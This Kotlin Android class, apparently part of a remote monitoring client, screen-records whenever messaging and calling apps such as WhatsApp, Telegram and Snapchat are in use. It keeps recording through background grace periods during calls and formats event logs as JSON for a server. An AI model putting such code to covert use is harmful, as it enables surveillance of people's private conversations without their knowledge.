package com.rdm.client

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

/**
 * Smart recording manager that handles intelligent recording scenarios:
 * - Background grace periods for calls
 * - Battery optimization
 * - Session-aware recording
 * - Comprehensive event logging
 */
class SmartRecordingManager(private val context: Context) {
    private val TAG = "SmartRecordingManager"

    // Recording state
    private val _isRecording = MutableStateFlow(false)
    val isRecording: StateFlow<Boolean> = _isRecording.asStateFlow()

    // Current recording app and session info
    private var currentApp: String? = null
    private var sessionStartTime: Long = 0
    private var lastActiveTime: Long = 0
    private var isInActiveSession = false

    // Background grace period (milliseconds)
    private var backgroundGracePeriodMs = 30000L // 30 seconds default
    private var maxRecordingDurationMs = 1800000L // 30 minutes max
    private var lowBatteryThreshold = 20 // 20%

    // Session tracking
    private val appSessionInfo = ConcurrentHashMap<String, AppSessionInfo>()

    // Coroutine scope for timers
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private var gracePeriodJob: Job? = null
    private var maxRecordingJob: Job? = null

    // Recording control callbacks
    private var onStartRecording: ((String) -> Unit)? = null
    private var onStopRecording: ((String) -> Unit)? = null
    private var onLogEvent: ((RecordingEvent) -> Unit)? = null

    // Battery and thermal monitoring
    private var batteryLevel: Int = 100
    private var isThermalThrottling = false

    // Recording quality tracking
    private var currentQuality = RecordingQuality.HIGH

    // Event logging
    private val eventLog = mutableListOf<RecordingEvent>()

    companion object {
        // App packages known to have active background sessions
        private val CALL_APPS = setOf(
            "com.whatsapp",
            "com.telegram.messenger",
            "jp.naver.line.android",
            "com.viber.voip",
            "com.discord",
            "com.facebook.orca", // Messenger
            "com.snapchat.android"
        )

        // Recording quality settings
        enum class RecordingQuality {
            HIGH,    // 8 Mbps - Full quality when app is active
            MEDIUM,  // 4 Mbps - When app in background but in active session
            LOW,     // 2 Mbps - When battery low or thermal throttling
            PAUSED   // 0 Mbps - Temporarily paused
        }
    }

    data class AppSessionInfo(
        val packageName: String,
        val sessionType: SessionType,
        val startTime: Long,
        val lastActiveTime: Long,
        val isInBackground: Boolean
    )

    enum class SessionType {
        NONE,           // Normal app usage
        VOICE_CALL,     // Active voice call
        VIDEO_CALL,     // Active video call
        VIDEO_SHARE,    // Screen/video sharing
        BACKGROUND_TASK // Background task (downloads, uploads)
    }

    /**
     * Recording event for comprehensive logging
     */
    data class RecordingEvent(
        val eventType: EventType,
        val timestamp: Long,
        val packageName: String?,
        val reason: String,
        val details: Map<String, Any>
    )

    enum class EventType {
        // Recording lifecycle
        RECORDING_STARTED,
        RECORDING_STOPPED,
        RECORDING_PAUSED,
        RECORDING_RESUMED,

        // Session management
        SESSION_TYPE_CHANGED,
        GRACE_PERIOD_STARTED,
        GRACE_PERIOD_CANCELLED,
        GRACE_PERIOD_EXPIRED,

        // Quality and performance
        QUALITY_CHANGED,
        BATTERY_LEVEL_CHANGED,
        THERMAL_STATUS_CHANGED,

        // App state changes
        APP_FOREGROUND,
        APP_BACKGROUND,
        APP_SWITCHED,

        // Limits and constraints
        MAX_DURATION_REACHED,
        BATTERY_LOW,
        BATTERY_CRITICAL,
        THERMAL_THROTTLING,

        // Configuration
        CONFIGURATION_CHANGED
    }

    /**
     * Configure recording parameters
     */
    fun configure(
        backgroundGracePeriodMs: Long = this.backgroundGracePeriodMs,
        maxRecordingDurationMs: Long = this.maxRecordingDurationMs,
        lowBatteryThreshold: Int = this.lowBatteryThreshold
    ) {
        this.backgroundGracePeriodMs = backgroundGracePeriodMs
        this.maxRecordingDurationMs = maxRecordingDurationMs
        this.lowBatteryThreshold = lowBatteryThreshold

        Log.d(TAG, "Configured: gracePeriod=${backgroundGracePeriodMs}ms, " +
                "maxDuration=${maxRecordingDurationMs}ms, lowBattery=${lowBatteryThreshold}%")
    }

    /**
     * Set recording control callbacks
     */
    fun setRecordingCallbacks(
        onStart: (String) -> Unit,
        onStop: (String) -> Unit,
        onLog: ((RecordingEvent) -> Unit)? = null
    ) {
        onStartRecording = onStart
        onStopRecording = onStop
        onLogEvent = onLog
    }

    /**
     * Log a recording event
     */
    private fun logEvent(
        eventType: EventType,
        packageName: String? = null,
        reason: String = "",
        details: Map<String, Any> = emptyMap()
    ) {
        val event = RecordingEvent(
            eventType = eventType,
            timestamp = System.currentTimeMillis(),
            packageName = packageName,
            reason = reason,
            details = details
        )

        // Add to internal log
        synchronized(eventLog) {
            eventLog.add(event)

            // Keep only last 1000 events to prevent memory issues
            if (eventLog.size > 1000) {
                eventLog.removeAt(0)
            }
        }

        // Log to Android log system
        val logMessage = buildString {
            append("[${eventType.name}]")
            if (packageName != null) append(" $packageName")
            if (reason.isNotEmpty()) append(" - $reason")
            if (details.isNotEmpty()) append(" | $details")
        }

        when (eventType) {
            EventType.RECORDING_STOPPED, EventType.RECORDING_PAUSED,
            EventType.BATTERY_CRITICAL, EventType.THERMAL_THROTTLING -> Log.w(TAG, logMessage)
            else -> Log.i(TAG, logMessage)
        }

        // Send to callback (e.g., for sending to server)
        onLogEvent?.invoke(event)
    }

    /**
     * Get all logged events
     */
    fun getEventLog(): List<RecordingEvent> {
        synchronized(eventLog) {
            return eventLog.toList()
        }
    }

    /**
     * Get events for a specific app
     */
    fun getEventsForApp(packageName: String): List<RecordingEvent> {
        synchronized(eventLog) {
            return eventLog.filter { it.packageName == packageName }
        }
    }

    /**
     * Get recent events
     */
    fun getRecentEvents(count: Int = 50): List<RecordingEvent> {
        synchronized(eventLog) {
            return eventLog.takeLast(count)
        }
    }

    /**
     * Clear event log
     */
    fun clearEventLog() {
        synchronized(eventLog) {
            eventLog.clear()
        }
        Log.d(TAG, "Event log cleared")
    }

    /**
     * Get event log as JSON for server transmission
     */
    fun getEventLogAsJson(): String {
        val events = getRecentEvents(100) // Last 100 events
        val jsonArray = org.json.JSONArray()

        for (event in events) {
            val eventJson = JSONObject().apply {
                put("event_type", event.eventType.name)
                put("timestamp", event.timestamp)
                put("package_name", event.packageName)
                put("reason", event.reason)
                put("details", JSONObject(event.details))
            }
            jsonArray.put(eventJson)
        }

        return jsonArray.toString()
    }

    /**
     * Handle app change with smart recording logic
     */
    fun onAppChanged(newApp: String?, shouldRecordApp: (String) -> Boolean) {
        val now = System.currentTimeMillis()
        lastActiveTime = now

        if (newApp == null) {
            // No app in foreground - check if we should maintain recording
            handleAppToBackground()
            return
        }

        val previousApp = currentApp
        currentApp = newApp

        // Log app coming to foreground
        logEvent(
            EventType.APP_FOREGROUND,
            newApp,
            "App came to foreground",
            mapOf("previous_app" to (previousApp ?: "none"))
        )

        // Determine session type for the app
        val sessionType = detectSessionType(newApp)

        if (shouldRecordApp(newApp)) {
            // This is a recordable app
            if (!_isRecording.value) {
                // Start recording
                startRecording(newApp, sessionType)
            } else if (previousApp != newApp) {
                // Different app - decide what to do
                handleAppSwitch(previousApp, newApp, sessionType)
            } else {
                // Same app - update session info
                updateSessionInfo(newApp, sessionType, false)
            }
        } else {
            // Not a recordable app
            if (_isRecording.value) {
                // We were recording, now switching to non-recordable app
                handleSwitchToNonRecordable(previousApp)
            }
        }
    }

    /**
     * Detect what type of session the app is in
     */
    private fun detectSessionType(packageName: String): SessionType {
        // For now, use simple heuristics
        // Can be enhanced with accessibility service or notification monitoring

        // Check if it's a call app
        if (packageName in CALL_APPS) {
            // Could check notification status or audio state
            // For now, assume potential active session
            return SessionType.VOICE_CALL
        }

        return SessionType.NONE
    }

    /**
     * Start recording for an app
     */
    private fun startRecording(packageName: String, sessionType: SessionType) {
        if (shouldSkipRecording()) {
            logEvent(
                EventType.RECORDING_STOPPED,
                packageName,
                "Recording skipped due to battery/thermal constraints",
                mapOf(
                    "battery_level" to batteryLevel,
                    "thermal_throttling" to isThermalThrottling,
                    "session_type" to sessionType.name
                )
            )
            return
        }

        Log.d(TAG, "Starting smart recording for: $packageName (session: $sessionType)")

        sessionStartTime = System.currentTimeMillis()
        isInActiveSession = sessionType != SessionType.NONE

        // Store session info
        appSessionInfo[packageName] = AppSessionInfo(
            packageName = packageName,
            sessionType = sessionType,
            startTime = sessionStartTime,
            lastActiveTime = sessionStartTime,
            isInBackground = false
        )

        // Log recording start
        logEvent(
            EventType.RECORDING_STARTED,
            packageName,
            "Recording started",
            mapOf(
                "session_type" to sessionType.name,
                "max_duration_ms" to maxRecordingDurationMs,
                "grace_period_ms" to backgroundGracePeriodMs,
                "battery_level" to batteryLevel,
                "thermal_status" to isThermalThrottling
            )
        )

        // Start max recording timer
        startMaxRecordingTimer()

        // Trigger recording
        _isRecording.value = true
        onStartRecording?.invoke(packageName)

        // Update recording quality based on session
        updateRecordingQuality()
    }

    /**
     * Handle app switch between recordable apps
     */
    private fun handleAppSwitch(
        previousApp: String?,
        newApp: String,
        newSessionType: SessionType
    ) {
        if (previousApp == null) {
            // No previous app, just start new recording
            startRecording(newApp, newSessionType)
            return
        }

        val previousSession = appSessionInfo[previousApp]
        val wasInActiveSession = previousSession?.sessionType != SessionType.NONE

        Log.d(TAG, "App switch: $previousApp -> $newApp (was active: $wasInActiveSession)")

        logEvent(
            EventType.APP_SWITCHED,
            newApp,
            "App switched from $previousApp to $newApp",
            mapOf(
                "previous_app" to (previousApp ?: "none"),
                "new_app" to newApp,
                "previous_session_type" to (previousSession?.sessionType?.name ?: "NONE"),
                "new_session_type" to newSessionType.name,
                "was_active_session" to wasInActiveSession
            )
        )

        if (wasInActiveSession) {
            // Previous app was in active session (call, etc.)
            // Grace period will be handled in background logic
            handleAppToBackground()
        } else {
            // Normal app switch - stop previous, start new
            stopRecording(previousApp, "App switched to $newApp")
            startRecording(newApp, newSessionType)
        }
    }

    /**
     * Handle switch to non-recordable app
     */
    private fun handleSwitchToNonRecordable(previousApp: String?) {
        if (previousApp == null) return

        val previousSession = appSessionInfo[previousApp]
        val wasInActiveSession = previousSession?.sessionType != SessionType.NONE

        if (wasInActiveSession) {
            // Was in active session - use grace period
            Log.d(TAG, "Active session going to background - starting grace period")
            handleAppToBackground()
        } else {
            // Normal usage - stop recording
            stopRecording(previousApp, "App switched to non-recordable app")
        }
    }

    /**
     * Handle app going to background with smart grace period
     */
    private fun handleAppToBackground() {
        currentApp?.let { app ->
            val session = appSessionInfo[app]
            val wasInActiveSession = session?.sessionType != SessionType.NONE

            logEvent(
                EventType.APP_BACKGROUND,
                app,
                "App went to background",
                mapOf(
                    "was_active_session" to wasInActiveSession,
                    "session_type" to (session?.sessionType?.name ?: "NONE"),
                    "grace_period_available" to wasInActiveSession
                )
            )

            if (wasInActiveSession) {
                // Start grace period for active sessions
                Log.d(TAG, "Starting ${backgroundGracePeriodMs}ms grace period for $app")
                startGracePeriod(app)
            } else {
                // No active session - stop recording immediately
                stopRecording(app, "App went to background (no active session)")
            }
        }
    }

    /**
     * Start grace period for potential return to app
     */
    private fun startGracePeriod(packageName: String) {
        // Cancel any existing grace period
        gracePeriodJob?.cancel()

        logEvent(
            EventType.GRACE_PERIOD_STARTED,
            packageName,
            "Grace period started for active session",
            mapOf(
                "grace_period_ms" to backgroundGracePeriodMs,
                "session_type" to (appSessionInfo[packageName]?.sessionType?.name ?: "UNKNOWN")
            )
        )

        gracePeriodJob = scope.launch {
            delay(backgroundGracePeriodMs)

            // Grace period expired - check if user returned
            if (currentApp != packageName) {
                Log.d(TAG, "Grace period expired for $packageName")

                logEvent(
                    EventType.GRACE_PERIOD_EXPIRED,
                    packageName,
                    "Grace period expired - app did not return",
                    mapOf("grace_period_ms" to backgroundGracePeriodMs)
                )

                stopRecording(packageName, "Grace period expired - app did not return")
            }
        }
    }

    /**
     * Cancel grace period (user returned to app)
     */
    private fun cancelGracePeriod() {
        gracePeriodJob?.cancel()
        gracePeriodJob = null

        logEvent(
            EventType.GRACE_PERIOD_CANCELLED,
            currentApp,
            "User returned to app during grace period"
        )
    }

    /**
     * Stop recording with reason
     */
    private fun stopRecording(packageName: String, reason: String) {
        if (!_isRecording.value) return

        Log.d(TAG, "Stopping recording for $packageName: $reason")

        // Calculate recording duration
        val recordingDuration = System.currentTimeMillis() - sessionStartTime
        val session = appSessionInfo[packageName]

        // Log recording stop
        logEvent(
            EventType.RECORDING_STOPPED,
            packageName,
            reason,
            mapOf(
                "recording_duration_ms" to recordingDuration,
                "session_type" to (session?.sessionType?.name ?: "UNKNOWN"),
                "final_quality" to currentQuality.name,
                "battery_level" to batteryLevel,
                "thermal_status" to isThermalThrottling
            )
        )

        // Cancel all timers
        gracePeriodJob?.cancel()
        maxRecordingJob?.cancel()

        // Update session info
        appSessionInfo[packageName]?.let { session ->
            appSessionInfo[packageName] = session.copy(
                isInBackground = true,
                lastActiveTime = System.currentTimeMillis()
            )
        }

        _isRecording.value = false
        isInActiveSession = false
        onStopRecording?.invoke(packageName)

        // Clear current app after a delay
        scope.launch {
            delay(1000)
            if (!_isRecording.value) {
                currentApp = null
            }
        }
    }

    /**
     * Start maximum recording duration timer
     */
    private fun startMaxRecordingTimer() {
        maxRecordingJob?.cancel()

        maxRecordingJob = scope.launch {
            delay(maxRecordingDurationMs)

            currentApp?.let { app ->
                Log.d(TAG, "Max recording duration reached for $app")
                stopRecording(app, "Maximum recording duration reached")
            }
        }
    }

    /**
     * Update session info when app state changes
     */
    private fun updateSessionInfo(packageName: String, sessionType: SessionType, isInBackground: Boolean) {
        appSessionInfo[packageName] = AppSessionInfo(
            packageName = packageName,
            sessionType = sessionType,
            startTime = sessionStartTime,
            lastActiveTime = System.currentTimeMillis(),
            isInBackground = isInBackground
        )

        // Update active session flag
        isInActiveSession = sessionType != SessionType.NONE

        // Update recording quality
        updateRecordingQuality()
    }

    /**
     * Update recording quality based on current state
     */
    private fun updateRecordingQuality() {
        val newQuality = when {
            batteryLevel < lowBatteryThreshold -> RecordingQuality.LOW
            isThermalThrottling -> RecordingQuality.LOW
            currentApp?.let { appSessionInfo[it]?.isInBackground } == true && isInActiveSession -> RecordingQuality.MEDIUM
            else -> RecordingQuality.HIGH
        }

        if (newQuality != currentQuality) {
            val oldQuality = currentQuality
            currentQuality = newQuality

            logEvent(
                EventType.QUALITY_CHANGED,
                currentApp,
                "Recording quality changed from $oldQuality to $newQuality",
                mapOf(
                    "old_quality" to oldQuality.name,
                    "new_quality" to newQuality.name,
                    "battery_level" to batteryLevel,
                    "thermal_throttling" to isThermalThrottling
                )
            )

            Log.d(TAG, "Recording quality changed: $oldQuality -> $newQuality")
        }

        // TODO: Send quality update to recording service
        // This would involve modifying ScreenRecordService to support bitrate changes
    }

    /**
     * Check if recording should be skipped due to constraints
     */
    private fun shouldSkipRecording(): Boolean {
        return when {
            batteryLevel < 10 -> {
                logEvent(
                    EventType.BATTERY_CRITICAL,
                    currentApp,
                    "Battery too low ($batteryLevel%) - skipping recording",
                    mapOf("battery_level" to batteryLevel)
                )
                true
            }
            isThermalThrottling && batteryLevel < 15 -> {
                logEvent(
                    EventType.THERMAL_THROTTLING,
                    currentApp,
                    "Thermal throttling with low battery - skipping recording",
                    mapOf(
                        "battery_level" to batteryLevel,
                        "thermal_throttling" to true
                    )
                )
                true
            }
            else -> false
        }
    }

    /**
     * Update battery level
     */
    fun updateBatteryLevel(level: Int) {
        val oldLevel = batteryLevel
        batteryLevel = level

        logEvent(
            EventType.BATTERY_LEVEL_CHANGED,
            currentApp,
            "Battery level changed from $oldLevel% to $level%",
            mapOf(
                "old_level" to oldLevel,
                "new_level" to level,
                "is_recording" to _isRecording.value
            )
        )

        Log.d(TAG, "Battery level: $level%")

        if (_isRecording.value && level < lowBatteryThreshold) {
            Log.w(TAG, "Battery low - reducing recording quality")
            updateRecordingQuality()
        }
    }

    /**
     * Update thermal throttling status
     */
    fun updateThermalStatus(isThrottling: Boolean) {
        val oldStatus = isThermalThrottling
        isThermalThrottling = isThrottling

        logEvent(
            EventType.THERMAL_STATUS_CHANGED,
            currentApp,
            "Thermal status changed from $oldStatus to $isThrottling",
            mapOf(
                "old_status" to oldStatus,
                "new_status" to isThrottling,
                "is_recording" to _isRecording.value
            )
        )

        Log.d(TAG, "Thermal throttling: $isThrottling")

        if (_isRecording.value) {
            updateRecordingQuality()
        }
    }

    /**
     * Get current session info for an app
     */
    fun getSessionInfo(packageName: String): AppSessionInfo? {
        return appSessionInfo[packageName]
    }

    /**
     * Get all active sessions
     */
    fun getAllSessions(): List<AppSessionInfo> {
        return appSessionInfo.values.toList()
    }

    /**
     * Force stop recording (e.g., from user action)
     */
    fun forceStopRecording(reason: String = "Force stop requested") {
        currentApp?.let { app ->
            stopRecording(app, reason)
        }
    }

    /**
     * Check if recording can be extended
     */
    fun canExtendRecording(): Boolean {
        val currentDuration = System.currentTimeMillis() - sessionStartTime
        return currentDuration < maxRecordingDurationMs &&
               !shouldSkipRecording() &&
               batteryLevel > lowBatteryThreshold
    }

    /**
     * Clean up resources
     */
    fun cleanup() {
        gracePeriodJob?.cancel()
        maxRecordingJob?.cancel()
        scope.cancel()
        appSessionInfo.clear()
        Log.d(TAG, "SmartRecordingManager cleaned up")
    }
}
